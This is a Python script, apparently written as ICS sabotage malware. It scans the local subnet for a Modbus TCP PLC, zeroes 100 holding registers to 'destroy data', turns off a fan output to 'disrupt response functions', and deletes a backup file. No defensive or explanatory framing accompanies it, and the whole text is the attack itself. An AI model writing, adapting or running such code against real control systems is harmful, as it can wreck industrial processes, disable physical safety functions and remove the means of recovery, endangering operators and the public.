from pymodbus.client.sync import ModbusTcpClient
import socket
import os

# Function to find the PLC's IP address
def find_plc_ip():
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to destroy data
def destroy_data(client):
    try:
        # Read the current program from the PLC
        program = client.read_holding_registers(0x1000, 100)
        program = program.registers
        
        # Overwrite the program with zeros to destroy the data
        client.write_registers(0x1000, [0] * 100)
        print("Data destroyed")
    except Exception as e:
        print(f"Failed to destroy data: {e}")

# Function to disrupt response functions
def disrupt_response_functions(client):
    try:
        # Disable the fan output to disrupt response functions
        client.write_coil(0x0000, 0)
        print("Response functions disrupted")
    except Exception as e:
        print(f"Failed to disrupt response functions: {e}")

# Function to delete backups
def delete_backups():
    try:
        # Delete backup files
        os.remove("backup.txt")
        print("Backups deleted")
    except Exception as e:
        print(f"Failed to delete backups: {e}")

# Main function
def main():
    plc_ip_address = find_plc_ip()
    if plc_ip_address:
        client = ModbusTcpClient(plc_ip_address)
        connection = client.connect()
        print(f"Connected to PLC: {connection}")
        
        # Destroy data
        destroy_data(client)
        
        # Disrupt response functions
        disrupt_response_functions(client)
        
        # Delete backups
        delete_backups()
    else:
        print("Failed to find PLC's IP address")
    client.close()

if __name__ == "__main__":
    main()